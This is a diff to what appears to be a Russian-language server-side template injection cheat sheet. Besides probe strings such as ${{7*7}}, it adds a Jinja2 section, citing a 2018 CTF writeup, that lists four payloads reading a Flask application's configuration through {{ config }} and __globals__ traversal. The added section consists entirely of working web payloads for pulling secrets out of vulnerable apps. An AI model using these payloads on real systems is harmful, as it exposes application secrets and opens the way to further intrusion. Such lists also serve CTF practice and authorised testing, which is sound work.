@@ -23,3 +23,12 @@ ${{7*7}}
 *{7*7}
 }}<tag>
 ```
+## Jinja2
+### Получение конфига
+[TokyoWesterns CTF 4th 2018 / Shrine / Writeup](https://ctftime.org/writeup/10895):
+```
+{{ config }}
+{{ self.__init__.__globals__['config'] }}
+{{ url_for.__globals__['current_app'].config }}
+{{ get_flashed_messages.__globals__['current_app'].config }}
+```
